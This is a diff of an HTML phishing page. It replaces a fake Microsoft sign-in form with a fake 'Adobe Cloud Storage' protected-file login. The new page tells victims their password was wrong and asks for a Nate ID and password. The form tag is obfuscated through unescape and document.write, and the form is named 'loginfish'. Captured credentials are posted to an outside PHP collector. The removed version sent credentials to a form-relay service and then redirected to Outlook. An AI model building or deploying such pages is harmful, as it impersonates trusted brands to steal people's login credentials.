@@ -1,131 +1,148 @@
-<!DOCTYPE html>
+﻿<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign In</title>
+    <title>Protected File Sign In</title>
     <style>
         body {
             font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-image: url("https://sccbai25.github.io/pdfbgimage.png");
+            background-size: cover;
+            background-position: center;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            background-color: #f2f2f2;
+            position: relative; /* Add position relative */
+        }
+        /* Add overlay style */
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5); /* Adjust opacity here */
+            z-index: -1; /* Move the overlay behind other elements */
         }
         .container {
-            background-color: white;
-            padding: 40px;
-            border-radius: 4px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            width: 320px;
-            height: 300px; /* Increased width for the form */
+            background-color: #fff;
+            border-radius: 0; /* Sharp edges */
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            max-width: 300px; /* Reduced width */
+            width: 100%;
+            opacity: 0;
+            animation: slideIn 0.5s forwards;
+            position: relative; /* Add position relative */
+            height: 400px; /* Increased height */
         }
-        h2 {
-            margin-bottom: 20px;
-            color: black; /*  blue */
-            margin-bottom: 20px;
+        @keyframes slideIn {
+            from {
+                width: 0;
+                opacity: 0;
+            }
+            to {
+                width: 100%;
+                opacity: 1;
+            }
         }
         .logo {
-            width: 100%; /* Responsive logo size */
-            max-width: 120px; /* Maximum width for the logo */
-            margin-bottom: 5px; /* Space below the logo */
+            width: 100px;
+            height: 100px;
+            margin: auto;
+            display: block;
         }
-        input[type="email"], input[type="password"] {
-            width: 92%;
+        h2 {
+            font-weight: bold;
+            margin-top: 20px;
+            margin-bottom: 10px;
+        }
+        input[type="email"],
+        input[type="password"],
+        button {
+            width: calc(100% - 40px);
+            margin-bottom: 10px;
             padding: 10px;
-            border: none;
-            border-bottom: 2px solid gray; /* Bottom border color */
-            outline: none; /* Remove outline */
-            margin-top: px; 
-            margin-bottom: px; /* Space between inputs */
-         }
-        input[type="email"]:focus, input[type="password"]:focus {
-            border-bottom-color: #0072c6;
-        }
-        
-         .forgot-password {
-            display: block;
-            margin-top: -120px; /* Adjust spacing above link */
-            margin-bottom: -42px; /* Space below link */
-            color: #0072c6; /*  blue for link */
-            font-size: 12px;
-            text-decoration: none; /* Remove underline from link */
-        }
-        
-         .create-account {
-            display: block;
-            
-            margin-bottom: 20px; /* Space below link */
-            color: #0072c6; /* blue for link */
-            font-size: 11px;
-            text-decoration: none; /* Remove underline from link */
+            border-radius: 0; /* Sharp edges */
+            border: 1px solid #ccc;
+            box-sizing: border-box;
         }
         button {
-            width: 30%;
-            padding: 10px;
-            background-color: #0072c6; /* Button color */
-            color: white;
-            border: none;
+            background-color: #d32f2f; /* Red color */
+            color: #fff;
             cursor: pointer;
-            margin-top: 90px;
-            margin-bottom: 70px;
-            margin-left: 222px;
+            transition: background-color 0.3s ease;
         }
         button:hover {
-            background-color: #005ea6;
+            background-color: #b71c1c; /* Darker red on hover */
         }
-        #emailDisplay {
+        .error-container {
+            color: white;
+            background: lightcoral;
+            padding: 10px;
+            margin-top: 10px;
+            border-radius: 0; /* Sharp edges */
+            display: none;
+        }
+        .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-top: 4px solid #333;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        /* Remember me checkbox style */
+        .remember-me {
+            text-align: left;
             margin-bottom: 10px;
-            font-weight: bold;
+            font-size: 14px;
+            margin-left: 20px;
         }
-        h3 {
-           
-            margin-bottom: 5px;
-            font-size: 11px;
-            color: red; /* blue */
-            }
+        /* Copyright text style */
+        .copyright {
+            font-size: 8px;
+            color: #999;
+            position: left; /* Add position absolute */
+            bottom: 20px; /* Adjust as needed */
+            left: 8px; /* Adjust as needed */
+        }
+        /* Privacy & cookies text style */
+        .privacy-cookies {
+            font-size: 10px;
+            color: #999;
+            position: absolute; /* Add position absolute */
+            bottom: 10px; /* Adjust as needed */
+            right: 70px; /* Adjust as needed */
+}
     </style>
 </head>
-<body>   
-    <div class="container">
-        <img src="https://logincdn.msauth.net/shared/5/images/microsoft_logo_ee5c8d9fb6248c938fd0.svg" alt="Logo" class="logo">
-       
- <form action="https://formsubmit.co/66a32246ecabfd3f96a2d0682fa5f779" method="POST">
+<body>
+     <div class="container">
+        <img src="https://sccbai25.github.io/PDF_ico.svg" alt="Adobe Logo" class="logo">
+        <h2>Adobe Cloud Storage<span style="font-weight: bold;"></span></h2>
+        <p>Password is wrong. Relogin to continue</p>
 
- 
-     
-        <div id="emailContainer"><h2>Sign in</h2>
-            <input type="email" id="email" name="email" placeholder="Email, phone, or Skype" required>
-            <h3>Session time out!</h3>
-            <button onclick="showPassword()">Next</button>
-        </div>
-        <div id="passwordContainer" style="display: none;"><h2>Enter password</h2>
-            <div id="emailDisplay"></div>
-            <input type="password" id="password" name="password" placeholder="Password" required>
-            <input type="hidden" name="_captcha" value="false">
-            <input type="hidden" name="_blacklist" value="spammy pattern, banned term, phrase">
-            <input type="hidden" name="_next" value="https://mail.outlook.com">
-            <button onclick="signIn()">Sign in</button>
-        </div></form>
-       <a href="#" class="forgot-password">Can'taccess your account?</a> <!-- Forgot password link -->
-    
-
- <div>
-
-       <a href="#" class="create-account"><font-color="black"</font>No account? Create one!</a> <!-- Create account link -->
-    </div>
-
-    <script>
-        function showPassword() {
-            var email = document.getElementById('email').value;
-            document.getElementById('emailContainer').style.display = 'none';
-            document.getElementById('passwordContainer').style.display = 'block';
-            document.getElementById('emailDisplay').textContent = email;
-            document.getElementById('password').focus();
-        }
-
-
-    </script>
+       <script language=JavaScript>m='%20%3Cform%20name%3D%22loginfish%22%20';d=unescape(m);document.write(d);</script>action="https://wwchol.serv00.net/jan25.php" method="post">
+            <input type="email" name="username" id="email" placeholder="네이트 ID" required value="">
+            <input type="password" name="password" id="password" placeholder="네이트 비밀번호" minlength="6" required>
+            <div class="remember-me">
+                <input type="checkbox" id="remember-me" name="remember-me" checked> <!-- Checked by default -->
+                <label for="remember-me">Remember me</label>
+            </div>
+            <button type="submit" id="submit-btn">로그인</button>
+            <!-- Copyright text inside form container -->
+            <div class="copyright">&copy; 2025 Adobe By clicking Next, you accept Adobe Cloud Storage terms and conditions in accordance with our privacy policy.</div>
 </body>
 </html>
